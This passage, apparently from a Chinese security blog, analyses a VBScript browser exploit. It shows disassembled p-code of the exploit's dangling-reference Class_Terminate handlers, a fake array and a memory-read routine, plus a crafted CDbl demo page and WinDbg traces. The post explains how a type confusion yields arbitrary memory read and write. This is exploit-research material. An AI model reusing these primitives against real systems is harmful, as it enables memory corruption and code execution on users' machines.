    027E502C - 004C    OP_NamedSt       &apos;str&apos;
    027E5031 - 0051    OP_Bos0         
    027E5032 - 0052    OP_Jmp           006D
    ***BOS(571,595)*** str = Right(str, Length) *****
    027E5037 - 0057    OP_Bos1          3
    027E5039 - 0059    OP_NamedAdr      &apos;str&apos;
    027E503E - 005E    OP_LocalAdr      -2
    027E5041 - 0061    OP_CallNmdAdr    &apos;Right&apos; 2
    027E5048 - 0068    OP_NamedSt       &apos;str&apos;
    ***BOS(607,621)*** tostring = str *****
    027E504D - 006D    OP_Bos1          4
    027E504F - 006F    OP_NamedAdr      &apos;str&apos;
    027E5054 - 0074    OP_LocalSt       0
    ***BOS(623,635)*** End Function *****
    027E5057 - 0077    OP_Bos1          5
    027E5059 - 0079    OP_FnReturn     
    027E505A - 007A    OP_Bos0         
    027E505B - 007B    OP_FuncEnd      

...
//&#x6B64;&#x5904;&#x7701;&#x7565;&#x5F88;&#x591A;&#x4E2A;&#x51FD;&#x6570;     
...
Function 24 (&apos;class_getp_a&apos;) [max stack = 1]://&#x51FD;&#x6570;23 class_getp_a &#x6DF7;&#x6DC6;&#x7C7B;a
    arg count = 0
    lcl count = 0
Pcode:
    027E61C4 - 0000    OP_CreateClass   &apos;class_getp_a&apos; //&#x6784;&#x9020;&#x51FD;&#x6570;
    027E61C9 - 0005    OP_FnBindEx      &apos;p&apos; 25 TRUE    //&#x6210;&#x5458;&#x51FD;&#x6570;p,&#x9ED8;&#x8BA4;&#x5C5E;&#x6027;&#x83B7;&#x53D6;&#x51FD;&#x6570;&#x5DF2;&#x6210;&#x529F;&#x7ED1;&#x5B9A;
    027E61D3 - 000F    OP_LocalSet      0
    027E61D6 - 0012    OP_FnReturn     //&#x51FD;&#x6570;&#x8FD4;&#x56DE;

Function 25 (&apos;p&apos;) [max stack = 3]: //&#x7EDF;&#x8BA1;&#x8BE5;&#x7C7B;&#x4E2D;&#x6700;&#x5927;&#x5806;&#x6808;&#x5C42;&#x6570;&#x4E3A;3   &#x7C7B;&#x4F3C;&#x4E8E;&#x51FD;&#x6570;&#x5D4C;&#x5957;&#x5C42;&#x6570;
    arg count = 0
    lcl count = 1
        lcl   1 =     Variant    &apos;fun&apos; //&#x4E00;&#x4E2A;&#x5C40;&#x90E8;&#x53D8;&#x91CF; Variant&#x7C7B;&#x578B;&#x7684; fun
    tmp count = 4 //4&#x4E2A;&#x4E34;&#x65F6;&#x201C;&#x53D8;&#x91CF;&#x201D;  &#x5FAA;&#x73AF;&#x8BA1;&#x6570;i &#x59CB;&#x672B;&#x7D22;&#x5F15;0&#xFF0C;6&#xFF0C;&#x6B65;&#x6570;1
Pcode:
    ***BOS(7710,7742)*** P = CDbl(&quot;174088534690791e-324&quot;) *****
    027E6210 - 0000    OP_Bos1          0
    027E6212 - 0002    OP_StrConst      &apos;174088534690791e-324&apos; //&#x53D6;&#x51FA;&#x5B57;&#x7B26;&#x4E32;&#x5E38;&#x91CF; &#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x2019;174088534690791e-324&#x2019;&#x8F6C;&#x6362;&#x4E3A;VARIANT&#x7ED3;&#x6784;
    027E6217 - 0007    OP_CallNmdAdr    &apos;CDbl&apos; 1 //&#x8C03;&#x7528;CDbl&#x51FD;&#x6570;&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x6362;&#x4E3A;&#x53CC;&#x7CBE;&#x5EA6;&#x503C;
    027E621E - 000E    OP_LocalSt       0      //&#x5B58;&#x5165;&#x8FD4;&#x56DE;&#x503C;p
    ***BOS(7748,7760)*** For i=0 To 6 *****
    027E6221 - 0011    OP_Bos1          1
    027E6223 - 0013    OP_IntConst      0
    027E6225 - 0015    OP_IntConst      6
    027E6227 - 0017    OP_IntConst      1
    027E6229 - 0019    OP_ForInitNamed  &apos;i&apos; 5 4  //&#x5FAA;&#x73AF;&#x6240;&#x9700;&#x53D8;&#x91CF;&#x521D;&#x59CB;&#x5316;
    027E6232 - 0022    OP_JccFalse      0047      //&#x5FAA;&#x73AF;&#x7EC8;&#x6B62; &#x8DF3;&#x8F6C;&#x5230;0x47&#x5904;
    ***BOS(7765,7786)*** wild_ref_arr_a(i) = 0 *****
    027E6237 - 0027    OP_Bos1          2
    027E6239 - 0029    OP_IntConst      0   //&#x5E38;&#x6574;&#x6570; 0
    027E623B - 002B    OP_NamedAdr      &apos;i&apos; //&#x53D6;&#x51FA;&#x7D22;&#x5F15;i&#x7684;Position
    027E6240 - 0030    OP_CallNmdSt     &apos;wild_ref_arr_a&apos; 1  //&#x5C06;0&#x8D4B;&#x503C;&#x7ED9;wild_ref_arr_a(i)
    ***BOS(7790,7794)*** Next *****
    027E6247 - 0037    OP_Bos1          3
    027E6249 - 0039    OP_ForNextNamed  &apos;i&apos; 5 4
    027E6252 - 0042    OP_JccTrue       0027 //&#x8DF3;&#x8F6C;&#x5230;&#x5FAA;&#x73AF;&#x5F00;&#x59CB;
    ***BOS(7798,7823)*** Set fun = New class_fun_a *****
    027E6257 - 0047    OP_Bos1          4
    027E6259 - 0049    OP_InitClass     &apos;class_fun_a&apos;
    027E625E - 004E    OP_LocalSet      1
    ***BOS(7827,7847)*** fun.mem = fake_array *****
    027E6261 - 0051    OP_Bos1          5
    027E6263 - 0053    OP_NamedAdr      &apos;fake_array&apos;  //&#x5148;&#x53D6;&#x51FA;fake_array&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x7684;&#x503C;
    027E6268 - 0058    OP_LocalAdr      1 //&#x627E;&#x5230;&#x6808;&#x4E2D;1&#x7684;&#x53D8;&#x91CF;fun
    027E626B - 005B    OP_MemSt         &apos;mem&apos; //memstore &#x5C06;fake_array&#x4FDD;&#x5B58;&#x5230;fun&#x7ED3;&#x6784;&#x7684;mem&#x6210;&#x5458;
    ***BOS(7853,7865)*** For i=0 To 6 *****
    027E6270 - 0060    OP_Bos1          6
    027E6272 - 0062    OP_IntConst      0
    027E6274 - 0064    OP_IntConst      6
    027E6276 - 0066    OP_IntConst      1
    027E6278 - 0068    OP_ForInitNamed  &apos;i&apos; 3 2
    027E6281 - 0071    OP_JccFalse      0097
    ***BOS(7870,7897)*** Set wild_ref_arr_a(i) = fun *****
    027E6286 - 0076    OP_Bos1          7
    027E6288 - 0078    OP_LocalAdr      1
    027E628B - 007B    OP_NamedAdr      &apos;i&apos;
    027E6290 - 0080    OP_CallNmdSet    &apos;wild_ref_arr_a&apos; 1
    ***BOS(7901,7905)*** Next *****
    027E6297 - 0087    OP_Bos1          8
    027E6299 - 0089    OP_ForNextNamed  &apos;i&apos; 3 2
    027E62A2 - 0092    OP_JccTrue       0076
    ***BOS(7910,7922)*** End Property *****
    027E62A7 - 0097    OP_Bos1          9
    027E62A9 - 0099    OP_FnReturn     
    027E62AA - 009A    OP_Bos0         
    027E62AB - 009B    OP_FuncEnd      

Function 26 (&apos;class_fun_a&apos;) [max stack = 1]://&#x51FD;&#x6570;26 class_fun_a&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;
    arg count = 0
    lcl count = 0
Pcode:
    027E62DC - 0000    OP_CreateClass   &apos;class_fun_a&apos;      //&#x6784;&#x9020;&#x51FD;&#x6570;
    027E62E1 - 0005    OP_FnBindEx      &apos;Read_Memory&apos; 27 FALSE //&#x6210;&#x5458;&#x51FD;&#x6570;
    027E62EB - 000F    OP_FnBindEx      &apos;SPP&apos; 28 FALSE //&#x6210;&#x5458;&#x51FD;&#x6570;
    027E62F5 - 0019    OP_CreateVar     &apos;mem&apos; FALSE  //&#x6210;&#x5458;&#x53D8;&#x91CF;
    027E62FB - 001F    OP_LocalSet      0
    027E62FE - 0022    OP_FnReturn     

Function 27 (&apos;Read_Memory&apos;) [max stack = 2]://27
    arg count = 0
    lcl count = 0
Pcode:
    ***BOS(7488,7523)*** Read_Memory = LenB(mem(rw_var + 8)) *****
    027E6330 - 0000    OP_Bos1          0
    027E6332 - 0002    OP_NamedAdr      &apos;rw_var&apos;
    027E6337 - 0007    OP_IntConst      8
    027E6339 - 0009    OP_Add          
    027E633A - 000A    OP_CallNmdAdr    &apos;mem&apos; 1
    027E6341 - 0011    OP_CallNmdAdr    &apos;LenB&apos; 1
    027E6348 - 0018    OP_LocalSt       0
    ***BOS(7556,7568)*** End Function *****
    027E634B - 001B    OP_Bos1          1
    027E634D - 001D    OP_FnReturn     
    027E634E - 001E    OP_Bos0         
    027E634F - 001F    OP_FuncEnd      

Function 28 (&apos;SPP&apos;) [max stack = 0]://28
    arg count = 0
    lcl count = 0
Pcode:
    ***BOS(7588,7600)*** End Function *****
    027E6380 - 0000    OP_Bos1          0
    027E6382 - 0002    OP_FnReturn     
    027E6383 - 0003    OP_Bos0         
    027E6384 - 0004    OP_FuncEnd      

Function 29 (&apos;class_setprop_a&apos;) [max stack = 1]://29 class_setprop_a&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;
    arg count = 0
    lcl count = 0
Pcode:
    027E63B8 - 0000    OP_CreateClass   &apos;class_setprop_a&apos; //&#x6784;&#x9020;&#x51FD;&#x6570; &#x8C03;&#x7528;VBScriptClass::Create&#x51FD;&#x6570;&#x6765;&#x521B;&#x5EFA;VBScriptClass&#x5BF9;&#x8C61;&#x3002;
    027E63BD - 0005    OP_FnBindEx      &apos;p&apos; 30 FALSE //&#x6210;&#x5458;&#x51FD;&#x6570;p,FALSE&#x8868;&#x793A;function bind&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x7ED1;&#x5B9A;&#x5931;&#x8D25;VBS&#x865A;&#x62DF;&#x673A;&#x4F1A;&#x8C03;&#x7528;VbscriptClass::CreateVar&#x521B;&#x5EFA;&#x76F8;&#x5E94;&#x6210;&#x5458;&#x53D8;&#x91CF;
    027E63C7 - 000F    OP_FnBindEx      &apos;SetProp&apos; 31 FALSE //&#x6210;&#x5458;&#x51FD;&#x6570; SetProp
    027E63D1 - 0019    OP_CreateVar     &apos;mem&apos; FALSE //&#x6210;&#x5458;&#x53D8;&#x91CF;mem
    027E63D7 - 001F    OP_LocalSet      0  //&#x8BBE;&#x7F6E;&#x8FD4;&#x56DE;&#x5730;&#x5740; &#x9000;&#x6808;&#x64CD;&#x4F5C; 
    027E63DA - 0022    OP_FnReturn     //&#x542B;&#x7CCA;&#x8FD4;&#x56DE;

Function 30 (&apos;p&apos;) [max stack = 0]:
    arg count = 0 //&#x51FD;&#x6570;p&#x53C2;&#x6570;&#x6570;&#x91CF;
    lcl count = 0 //&#x51FD;&#x6570;p&#x5C40;&#x90E8;&#x53D8;&#x91CF;&#x6570;&#x91CF;
Pcode:
    ***BOS(7236,7248)*** End Function *****
    027E640C - 0000    OP_Bos1          0  //&#x63CF;&#x8FF0;&#x5F53;&#x524D;&#x51FD;&#x6570;&#x4EE3;&#x7801;&#x5757;
    027E640E - 0002    OP_FnReturn         //push&#x8FD4;&#x56DE;&#x5730;&#x5740;
    027E640F - 0003    OP_Bos0                 //pop&#x8FD4;&#x56DE;&#x5730;&#x5740;
    027E6410 - 0004    OP_FuncEnd           //&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x7ED3;&#x675F;

Function 31 (&apos;SetProp&apos;) [max stack = 1]:
    arg count = 1 //&#x53C2;&#x6570;&#x6570;&#x91CF;&#x4E3A;1
        arg  -1 = ref Variant    &apos;value&apos; //&#x5F62;&#x53C2;value&#x4F4D;&#x4E8E;arg -1&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x5373;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x4E4B;&#x4E0A;&#xFF0C;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;intel32&#x6C47;&#x7F16;&#x4E2D;&#x7684;&#x5148;&#x538B;&#x5165;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x7136;&#x540E;&#x538B;&#x5165;&#x53C2;&#x6570;
    lcl count = 0 //&#x65E0;&#x5C40;&#x90E8;&#x53D8;&#x91CF;
Pcode:
    ***BOS(7283,7294)*** mem = Value *****
    027E644C - 0000    OP_Bos1          0
    027E644E - 0002    OP_LocalAdr      -1  //push arg-1&#x6570;&#x636E;value
    027E6451 - 0005    OP_NamedSt       &apos;mem&apos; //&#x4E0A;&#x4E00;&#x6B65;push&#x7684;value&#x4FDD;&#x5B58;&#x5728;mem&#x4E2D;
    ***BOS(7298,7309)*** SetProp = 0 *****
    027E6456 - 000A    OP_Bos1          1
    027E6458 - 000C    OP_IntConst      0 //&#x538B;&#x5165;&#x5E38;&#x6570;0
    027E645A - 000E    OP_LocalSt       0//&#x5C06;0&#x4FDD;&#x5B58;&#x5230;argv&#x4F4D;&#x7F6E;&#xFF0C;&#x5373;&#x8BBE;&#x7F6E;&#x51FD;&#x6570;Setprop&#x4E3A;0
    ***BOS(7312,7324)*** End Function *****
    027E645D - 0011    OP_Bos1          2
    027E645F - 0013    OP_FnReturn     //push&#x8FD4;&#x56DE;&#x5730;&#x5740;
    027E6460 - 0014    OP_Bos0         
    027E6461 - 0015    OP_FuncEnd      //&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x7ED3;&#x675F;

Function 32 (&apos;empty_class&apos;) [max stack = 1]:
    arg count = 0
    lcl count = 0
Pcode:
    027E6494 - 0000    OP_CreateClass   &apos;empty_class&apos;
    027E6499 - 0005    OP_LocalSet      0
    027E649C - 0008    OP_FnReturn     

Function 33 (&apos;class_ter_b&apos;) [max stack = 1]:
    arg count = 0
    lcl count = 0
Pcode:
    027E64D0 - 0000    OP_CreateClass   &apos;class_ter_b&apos;
    027E64D5 - 0005    OP_FnBindEx      &apos;Class_Terminate&apos; 34 TRUE
    027E64DF - 000F    OP_LocalSet      0
    027E64E2 - 0012    OP_FnReturn     

Function 34 (&apos;Class_Terminate&apos;) [max stack = 2]:
    flags     = (4002) sub private
    arg count = 0
    lcl count = 0
Pcode:
    ***BOS(7069,7100)*** Set wild_ref_arr_b(idx) = ab(1) *****
    027E6514 - 0000    OP_Bos1          0
    027E6516 - 0002    OP_IntConst      1
    027E6518 - 0004    OP_CallNmdAdr    &apos;ab&apos; 1
    027E651F - 000B    OP_NamedAdr      &apos;idx&apos;
    027E6524 - 0010    OP_CallNmdSet    &apos;wild_ref_arr_b&apos; 1
    ***BOS(7104,7117)*** idx = idx + 1 *****
    027E652B - 0017    OP_Bos1          1
    027E652D - 0019    OP_NamedAdr      &apos;idx&apos;
    027E6532 - 001E    OP_IntConst      1
    027E6534 - 0020    OP_Add          
    027E6535 - 0021    OP_NamedSt       &apos;idx&apos;
    ***BOS(7121,7130)*** ab(1) = 1 *****
    027E653A - 0026    OP_Bos1          2
    027E653C - 0028    OP_IntConst      1
    027E653E - 002A    OP_IntConst      1
    027E6540 - 002C    OP_CallNmdSt     &apos;ab&apos; 1
    ***BOS(7133,7140)*** End Sub *****
    027E6547 - 0033    OP_Bos1          3
    027E6549 - 0035    OP_FuncEnd      

Function 35 (&apos;class_ter_a&apos;) [max stack = 1]:
    arg count = 0
    lcl count = 0
Pcode:
    027E657C - 0000    OP_CreateClass   &apos;class_ter_a&apos;
    027E6581 - 0005    OP_FnBindEx      &apos;Class_Terminate&apos; 36 TRUE
    027E658B - 000F    OP_LocalSet      0
    027E658E - 0012    OP_FnReturn     

Function 36 (&apos;Class_Terminate&apos;) [max stack = 2]:
    flags     = (4002) sub private
    arg count = 0
    lcl count = 0
Pcode:
    ***BOS(6930,6961)*** Set wild_ref_arr_a(idx) = ab(1) *****
    027E65C0 - 0000    OP_Bos1          0
    027E65C2 - 0002    OP_IntConst      1
    027E65C4 - 0004    OP_CallNmdAdr    &apos;ab&apos; 1
    027E65CB - 000B    OP_NamedAdr      &apos;idx&apos;
    027E65D0 - 0010    OP_CallNmdSet    &apos;wild_ref_arr_a&apos; 1
    ***BOS(6965,6978)*** idx = idx + 1 *****
    027E65D7 - 0017    OP_Bos1          1
    027E65D9 - 0019    OP_NamedAdr      &apos;idx&apos;
    027E65DE - 001E    OP_IntConst      1
    027E65E0 - 0020    OP_Add          
    027E65E1 - 0021    OP_NamedSt       &apos;idx&apos;
    ***BOS(6982,6991)*** ab(1) = 1 *****
    027E65E6 - 0026    OP_Bos1          2
    027E65E8 - 0028    OP_IntConst      1
    027E65EA - 002A    OP_IntConst      1
    027E65EC - 002C    OP_CallNmdSt     &apos;ab&apos; 1
    ***BOS(6994,7001)*** End Sub *****
    027E65F3 - 0033    OP_Bos1          3
    027E65F5 - 0035    OP_FuncEnd      </code></pre><p>&#x6CE8;&#x610F;class_fun_a&#x7C7B;&#x548C;class_setprop_a&#x7C7B;</p>
<p>&#x4E0A;&#x4E00;&#x7BC7;&#x4E2D;&#x63D0;&#x5230;&#xFF0C;&#x5361;&#x5DF4;&#x65AF;&#x57FA;&#x5982;&#x4E0B;&#x7684;&#x516C;&#x5F0F;&#xFF1A;</p>
<p>//VVAL&#x7ED3;&#x6784;&#x5360;&#x7528;&#x7684;&#x6570;&#x636E;&#x91CF;&#x4F7F;&#x7528;&#x516C;&#x5F0F;0x32 + UTF-16&#x4E2D;&#x53D8;&#x91CF;&#x540D;&#x7684;&#x957F;&#x5EA6;&#x8BA1;&#x7B97;&#x3002;</p>
<pre><code>class_setprop_a 
[+0x00] VVAL &apos;p&apos;
        size:0x32 + len(&apos;p&apos;)=0x34
[+0x34]</code></pre><p><img src="/2019/08/13/20190813-1/1.jpg" alt="img"></p>
<p>&#x4E0B;&#x56FE;&#x663E;&#x793A;&#x4E86;&#x5728;&#x5206;&#x914D;&#x2019;class_fun_a&#x2019;&#x4EE3;&#x66FF;setprop_a_1&#x2019;&#x65F6;&#xFF0C;&#x2019;setprop_a_1&#x2019;&#x2019;&#x53D8;&#x91CF;&#x76F8;&#x5BF9;&#x4E8E;class_fun_a&#x2019;&#x53D8;&#x91CF;&#x7684;&#x4F4D;&#x7F6E;&#x3002;</p>
<p><img src="/2019/08/13/20190813-1/2.jpg" alt="img"></p>
<p>0xB8 - 0xAC =C</p>
<p><img src="/2019/08/13/20190813-1/3.png" alt="img"></p>
<p>String&#x7C7B;&#x578B;&#x7684;&#x5BF9;&#x8C61;&#x88AB;&#x8F6C;&#x6362;&#x4E3A;Array&#x7C7B;&#x578B;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x4E4B;&#x524D;&#x88AB;&#x8BA4;&#x4E3A;&#x662F;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x6570;&#x636E;&#x88AB;&#x89C6;&#x4E3A;Array&#x63A7;&#x4EF6;&#x7ED3;&#x6784;&#xFF0C;&#x5E76;&#x88AB;&#x5141;&#x8BB8;&#x8BBF;&#x95EE;&#x8FDB;&#x7A0B;&#x7684;&#x6574;&#x4E2A;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#x3002;</p>
<p>&#x540C;&#x6837;&#x7684;&#xFF0C;&#x5F53;&#x88AB;&#x4FEE;&#x6539;&#x4E3A;0x0003&#x5373;int&#x7C7B;&#x578B;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x6211;&#x4EEC;&#x4EFB;&#x610F;&#x8D4B;&#x503C;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x800C;&#x524D;&#x9762;&#x4FEE;&#x6539;&#x7684;Array&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;&#x8BFB;&#x5199;&#x4EFB;&#x610F;&#x5927;&#x5C0F;&#x5185;&#x5B58;&#x3002;</p>
<p>&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x7591;&#x95EE;&#x662F;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;Vbscript&#x4E2D;&#x5173;&#x4E8E;&#x7C7B;&#x53CA;&#x5176;&#x6210;&#x5458;&#x7684;&#x5927;&#x5C0F;&#x8BA1;&#x7B97;&#x516C;&#x5F0F;&#x662F;0x32+&#x53CC;&#x5B57;&#x6210;&#x5458;&#x540D;&#x79F0;&#x5927;&#x5C0F;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5199;&#x4E00;&#x4E2A;&#x5C0F;demo&#x6765;&#x6D4B;&#x8BD5;&#x4E00;&#x54C8;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=10&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;SCRIPT LANGUAGE=&quot;VBScript&quot;&gt;</span><br><span class="line">Class class_getp_b  //&#x6DF7;&#x6DC6;&#x7C7B;2</span><br><span class="line">	Dim mem</span><br><span class="line">	Public Default Property Get P</span><br><span class="line">		Dim fun</span><br><span class="line">		&apos;00000003 00000000</span><br><span class="line">		P = CDbl(&quot;636598737289582e-328&quot;)</span><br><span class="line">	End Property</span><br><span class="line"></span><br><span class="line">	Function SPP</span><br><span class="line">	End Function</span><br><span class="line">End Class</span><br><span class="line"> ab = New class_getp_b</span><br><span class="line"> ab = null</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>&#x5BF9;&#x5E94;&#x7684;p-code&#x7801;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; ld vbscript</span><br><span class="line">Symbols loaded for vbscript</span><br><span class="line">0:000&gt; bp CScriptRuntime::RunNoEH</span><br><span class="line">0:000&gt; bl</span><br><span class="line">     0 e Disable Clear  682327fe     0001 (0001)  0:**** vbscript!CScriptRuntime::RunNoEH</span><br><span class="line">0:000&gt; g</span><br><span class="line">(b3c.f0c): Break instruction exception - code 80000003 (first chance)</span><br><span class="line">eax=7ffd8000 ebx=00000000 ecx=00000000 edx=77bef125 esi=00000000 edi=00000000</span><br><span class="line">eip=77b840f0 esp=02fbfb08 ebp=02fbfb34 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">77b840f0 cc              int     3</span><br><span class="line">0:010&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=020ad470 ebx=020ad5bc ecx=020ad4ac edx=00000000 esi=020ad4ac edi=020ad5bc</span><br><span class="line">eip=682327fe esp=020ad458 ebp=020ad49c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!CScriptRuntime::RunNoEH:</span><br><span class="line">682327fe 8bff            mov     edi,edi</span><br><span class="line">0:005&gt;  !load pykd.pyd</span><br><span class="line">0:005&gt; !py C:\Users\xutianyao\Desktop\VBscriptInternals-master\kl_vbs_disasm_windbg.py</span><br><span class="line">    Global code [max stack = 1]:</span><br><span class="line">        flags     = (8000) noconnect</span><br><span class="line">    Pcode:</span><br><span class="line">        01D2B120 - 0000    OP_FnBind        &apos;class_getp_b&apos; 1 TRUE</span><br><span class="line">        ***BOS(201,222)*** ab = New class_getp_b *****</span><br><span class="line">        01D2B12A - 000A    OP_Bos1          0</span><br><span class="line">        01D2B12C - 000C    OP_InitClass     &apos;class_getp_b&apos;</span><br><span class="line">        01D2B131 - 0011    OP_NamedSt       &apos;ab&apos;</span><br><span class="line">        ***BOS(225,234)*** ab = null *****</span><br><span class="line">        01D2B136 - 0016    OP_Bos1          1</span><br><span class="line">        01D2B138 - 0018    OP_Null         </span><br><span class="line">        01D2B139 - 0019    OP_NamedSt       &apos;ab&apos;</span><br><span class="line">        01D2B13E - 001E    OP_Bos0         </span><br><span class="line">        01D2B13F - 001F    OP_FuncEnd      </span><br><span class="line"></span><br><span class="line">    Function 1 (&apos;class_getp_b&apos;) [max stack = 1]://&#x6784;&#x9020;&#x51FD;&#x6570;</span><br><span class="line">        flags     = (8000) noconnect</span><br><span class="line">        arg count = 0</span><br><span class="line">        lcl count = 0</span><br><span class="line">    Pcode:</span><br><span class="line">        01D2B170 - 0000    OP_CreateClass   &apos;class_getp_b&apos;   //&#x5E94;&#x8BE5;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x8FD9;&#x91CC;</span><br><span class="line">        01D2B175 - 0005    OP_FnBindEx      &apos;P&apos; 2 TRUE</span><br><span class="line">        01D2B17F - 000F    OP_FnBindEx      &apos;SPP&apos; 3 FALSE</span><br><span class="line">        01D2B189 - 0019    OP_CreateVar     &apos;mem&apos; FALSE</span><br><span class="line">        01D2B18F - 001F    OP_LocalSet      0</span><br><span class="line">        01D2B192 - 0022    OP_FnReturn     </span><br><span class="line"></span><br><span class="line">    Function 2 (&apos;P&apos;) [max stack = 2]:</span><br><span class="line">        flags     = (8000) noconnect</span><br><span class="line">        arg count = 0</span><br><span class="line">        lcl count = 1</span><br><span class="line">            lcl   1 =     Variant    &apos;fun&apos;</span><br><span class="line">    Pcode:</span><br><span class="line">        ***BOS(108,140)*** P = CDbl(&quot;636598737289582e-328&quot;) *****</span><br><span class="line">        01D2B1CC - 0000    OP_Bos1          0</span><br><span class="line">        01D2B1CE - 0002    OP_StrConst      &apos;636598737289582e-328&apos;</span><br><span class="line">        01D2B1D3 - 0007    OP_CallNmdAdr    &apos;CDbl&apos; 1</span><br><span class="line">        01D2B1DA - 000E    OP_LocalSt       0</span><br><span class="line">        ***BOS(143,155)*** End Property *****</span><br><span class="line">        01D2B1DD - 0011    OP_Bos1          1</span><br><span class="line">        01D2B1DF - 0013    OP_FnReturn     </span><br><span class="line">        01D2B1E0 - 0014    OP_Bos0         </span><br><span class="line">        01D2B1E1 - 0015    OP_FuncEnd      </span><br><span class="line"></span><br><span class="line">    Function 3 (&apos;SPP&apos;) [max stack = 0]:</span><br><span class="line">        flags     = (8000) noconnect</span><br><span class="line">        arg count = 0</span><br><span class="line">        lcl count = 0</span><br><span class="line">    Pcode:</span><br><span class="line">        ***BOS(175,187)*** End Function *****</span><br><span class="line">        01D2B214 - 0000    OP_Bos1          0</span><br><span class="line">        01D2B216 - 0002    OP_FnReturn     </span><br><span class="line">        01D2B217 - 0003    OP_Bos0         </span><br><span class="line">        01D2B218 - 0004    OP_FuncEnd</span><br></pre></td></tr></table></figure>

<p>&#x5206;&#x6790;p-code&#x7801;&#xFF0C;&#x611F;&#x89C9;&#x8FD8;&#x4E0D;&#x592A;&#x591F;&#xFF0C;&#x5173;&#x4E8E;&#x7C7B;&#x5206;&#x914D;&#x7684;&#x5206;&#x914D;&#x8FC7;&#x7A0B;&#xFF0C;&#x6211;&#x4EEC;&#x8FD8;&#x9700;&#x8981;&#x770B;&#x770B;&#x662F;&#x5728;&#x54EA;&#x91CC;&#x8FDB;&#x884C;&#x5206;&#x914D;&#x7684;&#xFF0C;&#x5982;&#x4F55;&#x5206;&#x914D;&#x7A7A;&#x95F4;&#x7684;&#x3002;</p>
